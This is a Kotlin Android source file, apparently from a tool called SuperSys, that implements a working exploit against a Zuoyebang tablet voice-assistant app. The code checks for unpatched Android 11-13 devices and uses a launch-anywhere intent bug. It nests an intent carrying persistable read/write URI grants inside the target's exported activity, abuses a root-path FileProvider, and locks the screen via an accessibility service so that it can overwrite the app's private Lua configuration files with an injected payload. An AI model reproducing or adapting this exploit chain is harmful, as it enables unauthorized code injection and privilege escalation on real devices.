package com.cfks.supersys.ui

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ImageView
import net.steamcrafted.materialiconlib.MaterialDrawableBuilder
import android.widget.TextView
import android.widget.Toast
import androidx.fragment.app.Fragment
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import org.xmlpull.v1.XmlPullParser
import com.cfks.startanywhere.StartAnyWhere
import com.cfks.supersys.MainActivity
import com.cfks.supersys.MainActivity.Companion.EXTRA_SUPERSYS_INSTALL
import com.cfks.supersys.MainActivity.Companion.KEY_STORED_URI
import com.cfks.supersys.MainActivity.Companion.PREFS_NAME
import com.cfks.supersys.R
import com.cfks.supersys.databinding.FragmentHomeBinding
import com.cfks.supersys.service.ScreenControlService
import com.cfks.supersys.util.UriUtils

class HomeFragment : Fragment() {

    companion object {
        const val TARGET_PACKAGE = "com.zuoyebang.iot.pad.zpvoiceassistant"
        const val TARGET_ACTIVITY = "com.zuoyebang.iot.pad.zpvoiceassistant.UnlockScreenBridgeActivity"
        private const val FILE_PROVIDER_PATHS_KEY = "android.support.FILE_PROVIDER_PATHS"

        const val TARGET_FILE_PATH_1 =
            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/tasks/nlucfg.lua"
        const val TARGET_FILE_PATH_2 =
            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/66dfe05f8ea296000161c16f/nlucfg.lua"

        val TARGET_FILE_PATHS = listOf(TARGET_FILE_PATH_1, TARGET_FILE_PATH_2)

        @Volatile
        var pendingExploit = false
        var pendingAuthority: String? = null
        var pendingRootName: String? = null
    }

    private var _binding: FragmentHomeBinding? = null
    private val binding get() = _binding!!

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentHomeBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        setupStatusCard()
        setupInstallButton()
        setupRevokeButton()
        setupDeviceInfo()
    }

    override fun onResume() {
        super.onResume()
        checkInstallStatus()
        // If we were waiting for accessibility permission and it's now enabled, show a prompt
        if (pendingExploit && isAccessibilityEnabled(requireContext())) {
            pendingExploit = false
            val authority = pendingAuthority
            val rootName = pendingRootName
            pendingAuthority = null
            pendingRootName = null
            if (authority != null) {
                MaterialAlertDialogBuilder(requireContext())
                    .setTitle("无障碍权限已开启")
                    .setMessage("无障碍服务已启用，请再次点击安装按钮继续安装流程。")
                    .setPositiveButton("知道了", null)
                    .setCancelable(false)
                    .show()
            }
        }
    }

    // region Install Status

    private fun checkInstallStatus() {
        val ctx = requireContext()
        val prefs = ctx.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
        val storedUris = getStoredUris(prefs)

        if (storedUris.isEmpty()) {
            updateInstallStatus(false)
            return
        }

        Thread {
            var allInstalled = true
            for (uriStr in storedUris) {
                val content = UriUtils.readUri(ctx, uriStr)
                if (content == null || !content.startsWith("-- SuperSys")) {
                    allInstalled = false
                    break
                }
            }
            requireActivity().runOnUiThread {
                if (_binding != null && isAdded) {
                    updateInstallStatus(allInstalled)
                }
            }
        }.start()
    }

    private fun getStoredUris(prefs: android.content.SharedPreferences): List<String> {
        val uris = mutableListOf<String>()
        for (i in TARGET_FILE_PATHS.indices) {
            val uri = prefs.getString("${KEY_STORED_URI}_$i", null)
            if (uri != null) uris.add(uri)
        }
        return uris
    }

    private fun updateInstallStatus(installed: Boolean) {
        if (installed) {
            binding.tvStatusBadge.text = "已安装"
            binding.tvStatusMessage.text = "SuperSys 已成功安装并正在运行"
            binding.dotStatus.setBackgroundResource(R.drawable.bg_status_badge)
        } else {
            binding.tvStatusBadge.text = "未安装"
            binding.tvStatusMessage.text = "SuperSys 尚未安装，请点击下方安装按钮"
        }
    }

    // endregion

    private fun setupStatusCard() {
        binding.tvStatusVersion.text = getString(R.string.home_version_value)
    }

    private fun setupInstallButton() {
        val listener = View.OnClickListener { performInstallCheck() }
        binding.btnInstall.setOnClickListener(listener)
        binding.cardInstall.setOnClickListener(listener)
    }

    private fun setupRevokeButton() {
        binding.btnRevokePermissions.setOnClickListener {
            val activity = requireActivity() as? MainActivity
            activity?.revokeAllPermissions()
            updateInstallStatus(false)
        }
    }

    // region Install Logic

    private fun performInstallCheck() {
        val ctx = requireContext()

        // Step 1: Check StartAnyWhere support
        if (!canStartAnyWhere()) {
            showUnsupportedDialog("不支持的设备:StartAnyWhere不可用\n需要Android 11-13且安全补丁日期早于2023-03-01")
            return
        }

        // Step 2: Check persist.sys.audio_type
        val audioType = getSystemProperty("persist.sys.audio_type", "")
        if (audioType != "aispeech") {
            MaterialAlertDialogBuilder(ctx)
                .setTitle("audio_type 不匹配")
                .setMessage("不支持的设备:需要persist.sys.audio_type为aispeech,当前[$audioType]")
                .setPositiveButton("跳过检查") { _, _ ->
                    continueInstallCheck(ctx)
                }
                .setNegativeButton("取消", null)
                .setCancelable(false)
                .show()
            return
        }

        // Step 3: Check if target package has UnlockScreenBridgeActivity
        if (!isActivityExists(ctx, TARGET_PACKAGE, TARGET_ACTIVITY)) {
            showUnsupportedDialog("不支持的设备:缺失UnlockScreenBridgeActivity")
            return
        }

        // Step 4: Find a FileProvider with root-path in the target package
        val rootPathInfo = findRootPathFileProvider(ctx, TARGET_PACKAGE)
        if (rootPathInfo == null) {
            showUnsupportedDialog("不支持的设备:缺失root-path FileProvider")
            return
        }

        val authority = rootPathInfo.first
        val rootName = rootPathInfo.second

        // Step 5: Check if we already have URI permissions for both files
        val uri1 = buildUriStr(authority, rootName, TARGET_FILE_PATHS[0])
        val uri2 = buildUriStr(authority, rootName, TARGET_FILE_PATHS[1])

        if (hasUriPermission(ctx, uri1) && hasUriPermission(ctx, uri2)) {
            // Already authorized — skip exploit, directly inject payload
            directInject(uri1, uri2)
            return
        }

        // Step 6: Check accessibility permission (auto-request if needed)
        checkAccessibilityAndExecute(ctx, authority, rootName)
    }

    private fun continueInstallCheck(ctx: android.content.Context) {
        // Step 3: Check if target package has UnlockScreenBridgeActivity
        if (!isActivityExists(ctx, TARGET_PACKAGE, TARGET_ACTIVITY)) {
            showUnsupportedDialog("不支持的设备:缺失UnlockScreenBridgeActivity")
            return
        }

        // Step 4: Find a FileProvider with root-path in the target package
        val rootPathInfo = findRootPathFileProvider(ctx, TARGET_PACKAGE)
        if (rootPathInfo == null) {
            showUnsupportedDialog("不支持的设备:缺失root-path FileProvider")
            return
        }

        val authority = rootPathInfo.first
        val rootName = rootPathInfo.second

        // Step 5: Check if we already have URI permissions for both files
        val uri1 = buildUriStr(authority, rootName, TARGET_FILE_PATHS[0])
        val uri2 = buildUriStr(authority, rootName, TARGET_FILE_PATHS[1])

        if (hasUriPermission(ctx, uri1) && hasUriPermission(ctx, uri2)) {
            directInject(uri1, uri2)
            return
        }

        // Step 6: Check accessibility permission (auto-request if needed)
        checkAccessibilityAndExecute(ctx, authority, rootName)
    }

    private fun checkAccessibilityAndExecute(ctx: android.content.Context, authority: String, rootName: String) {
        // Always store authority/rootName for launchSecondExploit() to use later
        pendingAuthority = authority
        pendingRootName = rootName

        if (!isAccessibilityEnabled(ctx)) {
            pendingExploit = true
            pendingAuthority = authority
            pendingRootName = rootName

            MaterialAlertDialogBuilder(ctx)
                .setTitle("需要无障碍权限")
                .setMessage("SuperSys 需要无障碍权限来执行熄屏操作。\n请在设置中启用 SuperSys 的无障碍服务，返回后请手动点击安装按钮继续。")
                .setPositiveButton("去设置") { _, _ ->
                    val settingsIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    StartAnyWhere.pullSpecialActivity(ctx, settingsIntent)
                }
                .setNegativeButton("取消") { _, _ ->
                    pendingExploit = false
                    pendingAuthority = null
                    pendingRootName = null
                }
                .setCancelable(false)
                .show()
            return
        }

        // Step 7: Lock screen then execute exploit
        executeExploit(authority, rootName)
    }

    private fun executeExploit(authority: String, rootName: String) {
        val ctx = requireContext()

        // Clear any previous errors
        MainActivity.installErrors.clear()

        // Only launch exploit for the first file — step 2 will be triggered by MainActivity
        val targetFilePath = TARGET_FILE_PATHS[0]
        val uriStr = if (rootName.isNotEmpty()) {
            "content://$authority/$rootName$targetFilePath"
        } else {
            "content://$authority$targetFilePath"
        }
        val hackedIntent = getHackedIntent(uriStr, 1)
        StartAnyWhere.pullSpecialActivity(ctx, hackedIntent)

        // Lock screen ~15ms later (concurrent but slightly delayed)
        Handler(Looper.getMainLooper()).postDelayed({
            ScreenControlService.lockScreen()
        }, 15)
    }

    private fun buildUriStr(authority: String, rootName: String, filePath: String): String {
        return if (rootName.isNotEmpty()) {
            "content://$authority/$rootName$filePath"
        } else {
            "content://$authority$filePath"
        }
    }

    private fun hasUriPermission(ctx: android.content.Context, uriStr: String): Boolean {
        return try {
            val uri = Uri.parse(uriStr)
            val resolver = ctx.contentResolver
            val input = resolver.openInputStream(uri)
            input?.close()
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun directInject(uri1: String, uri2: String) {
        val activity = requireActivity() as? MainActivity
        if (activity == null) {
            showUnsupportedDialog("无法执行注入: Activity不可用")
            return
        }

        Thread {
            activity.injectDirectly(uri1, uri2)
        }.start()
    }

    private fun getHackedIntent(url: String, step: Int): Intent {
        val ctx = requireContext()

        // intent1: targets UnlockScreenBridgeActivity
        val intent1 = Intent().setComponent(
            ComponentName(TARGET_PACKAGE, TARGET_ACTIVITY)
        )

        val uri = Uri.parse(url)

        // Resolve MIME type from the content provider (fallback to */* on failure)
        val mimeType = try {
            ctx.contentResolver.getType(uri) ?: "*/*"
        } catch (e: Exception) {
            "*/*"
        }

        // intent2: targets our own MainActivity with the file URI + grant flags + install marker + step
        val intent2 = Intent()
            .setComponent(
                ComponentName(ctx.packageName, MainActivity::class.java.name)
            )
            .setDataAndType(uri, mimeType)
            .putExtra(MainActivity.EXTRA_SUPERSYS_INSTALL, true)
            .putExtra(MainActivity.EXTRA_INSTALL_STEP, step)
            .addFlags(
                Intent.FLAG_GRANT_PREFIX_URI_PERMISSION or
                Intent.FLAG_GRANT_READ_URI_PERMISSION or
                Intent.FLAG_GRANT_WRITE_URI_PERMISSION or
                Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or
                Intent.FLAG_ACTIVITY_NEW_TASK
            )

        intent1.putExtra("originalIntent", intent2)
        return intent1
    }

    // endregion

    // region Checks

    private fun isActivityExists(
        ctx: android.content.Context,
        packageName: String,
        activityName: String
    ): Boolean {
        return try {
            val pm = ctx.packageManager
            val pkgInfo = pm.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES)
            pkgInfo.activities?.any { it.name == activityName } == true
        } catch (e: Exception) {
            false
        }
    }

    private fun findRootPathFileProvider(
        ctx: android.content.Context,
        packageName: String
    ): Pair<String, String>? {
        return try {
            val pm = ctx.packageManager
            val pkgInfo = pm.getPackageInfo(
                packageName,
                PackageManager.GET_PROVIDERS or PackageManager.GET_META_DATA
            )
            val providers = pkgInfo.providers ?: return null
            val res = pm.getResourcesForApplication(packageName)

            for (provider in providers) {
                val rawAuthority = provider.authority ?: continue
                val authority = rawAuthority.split(";").firstOrNull()?.trim()
                    ?: continue

                val metaData = provider.metaData ?: continue
                val xmlResId = metaData.getInt(FILE_PROVIDER_PATHS_KEY, 0)
                if (xmlResId == 0) continue

                val parser = res.getXml(xmlResId)
                var eventType = parser.eventType
                while (eventType != XmlPullParser.END_DOCUMENT) {
                    if (eventType == XmlPullParser.START_TAG &&
                        parser.name == "root-path"
                    ) {
                        val name = parser.getAttributeValue(null, "name") ?: ""
                        parser.close()
                        return Pair(authority, name)
                    }
                    eventType = parser.next()
                }
                parser.close()
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    private fun isAccessibilityEnabled(ctx: android.content.Context): Boolean {
        val serviceName = "${ctx.packageName}/${ScreenControlService::class.java.name}"
        val enabled = Settings.Secure.getInt(
            ctx.contentResolver,
            Settings.Secure.ACCESSIBILITY_ENABLED,
            0
        ) == 1
        if (!enabled) return false
        val list = Settings.Secure.getString(
            ctx.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        return list?.contains(serviceName) == true
    }

    private fun getSystemProperty(key: String, default: String): String {
        return try {
            val cls = Class.forName("android.os.SystemProperties")
            val method = cls.getMethod("get", String::class.java, String::class.java)
            method.invoke(null, key, default) as String
        } catch (e: Exception) {
            default
        }
    }

    // endregion

    // region Device Info

    private fun setupDeviceInfo() {
        setInfoItem(
            R.id.info_supersys,
            MaterialDrawableBuilder.IconValue.CHECK_CIRCLE,
            getString(R.string.home_info_supersys),
            getString(R.string.home_info_supersys_value)
        )
        setInfoItem(
            R.id.info_android,
            MaterialDrawableBuilder.IconValue.ANDROID,
            getString(R.string.home_info_android),
            "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})"
        )
        setInfoItem(
            R.id.info_device,
            MaterialDrawableBuilder.IconValue.PHONE,
            getString(R.string.home_info_device),
            "${Build.MANUFACTURER} ${Build.MODEL}"
        )
        setInfoItem(
            R.id.info_patch,
            MaterialDrawableBuilder.IconValue.SHIELD,
            getString(R.string.home_info_patch),
            Build.VERSION.SECURITY_PATCH ?: "未知"
        )
        setInfoItem(
            R.id.info_startanywhere,
            MaterialDrawableBuilder.IconValue.INFORMATION,
            getString(R.string.home_info_startanywhere),
            if (canStartAnyWhere()) getString(R.string.home_info_startanywhere_yes)
            else getString(R.string.home_info_startanywhere_no)
        )
    }

    private fun canStartAnyWhere(): Boolean {
        return Build.VERSION.SDK_INT >= 30 &&
               Build.VERSION.SDK_INT <= 33 &&
               Build.VERSION.SECURITY_PATCH != null &&
               Build.VERSION.SECURITY_PATCH.compareTo("2023-03-01") < 0
    }

    private fun setInfoItem(itemId: Int, iconValue: MaterialDrawableBuilder.IconValue, label: String, value: String) {
        val item = binding.root.findViewById<View>(itemId) ?: return
        val icon = item.findViewById<ImageView>(R.id.iv_info_icon)
        val tvLabel = item.findViewById<TextView>(R.id.tv_info_label)
        val tvValue = item.findViewById<TextView>(R.id.tv_info_value)
        val colorPrimary = resources.getColor(R.color.primary, null)
        icon.setImageDrawable(
            MaterialDrawableBuilder.with(requireContext())
                .setIcon(iconValue)
                .setColor(colorPrimary)
                .setSizeDp(24)
                .build()
        )
        tvLabel.text = label
        tvValue.text = value
    }

    // endregion

    private fun showUnsupportedDialog(message: String) {
        MaterialAlertDialogBuilder(requireContext())
            .setTitle("不支持")
            .setMessage(message)
            .setPositiveButton("确定", null)
            .show()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}
